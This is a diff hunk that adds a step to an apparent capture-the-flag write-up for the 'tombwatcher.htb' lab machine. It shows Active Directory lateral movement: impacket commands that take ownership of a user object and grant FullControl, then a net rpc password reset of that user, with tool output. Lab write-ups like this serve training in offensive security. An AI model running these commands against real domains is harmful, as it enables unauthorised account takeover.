@@ -327,6 +327,30 @@ HASH PASS: Substituting user supplied NTLM HASH...
 ### Lateral movement from sam to john
 
 ```
+impacket-owneredit -action write -new-owner sam -target john tombwatcher.htb/sam:'newP@ssword2022' -dc-ip 10.129.144.23                   
+Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Current owner information below
+[*] - SID: S-1-5-21-1392491010-1358638721-2126982587-512
+[*] - sAMAccountName: Domain Admins
+[*] - distinguishedName: CN=Domain Admins,CN=Users,DC=tombwatcher,DC=htb
+[*] OwnerSid modified successfully!
+                                                                                                                    
+┌──(kali㉿kali)-[~/machines/tombwatcher]
+└─$ impacket-dacledit -action write -rights FullControl -principal sam -target john tombwatcher.htb/sam:'newP@ssword2022' -dc-ip 10.129.144.23
+Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+/usr/share/doc/python3-impacket/examples/dacledit.py:390: DeprecationWarning: codecs.open() is deprecated. Use open() instead.
+  with codecs.open(self.filename, 'w', 'utf-8') as outfile:
+[*] DACL backed up to dacledit-20260924-044909.bak
+[*] DACL modified successfully!
+                                                                                                                    
+┌──(kali㉿kali)-[~/machines/tombwatcher]
+└─$ net rpc password "john" "newP@ssword2022" -U "tombwatcher.htb"/"sam"%"newP@ssword2022" -S 10.129.144.23
+                                                                                                                    
+┌──(kali㉿kali)-[~/machines/tombwatcher]
+└─$ 
+
 ```
 
 ---
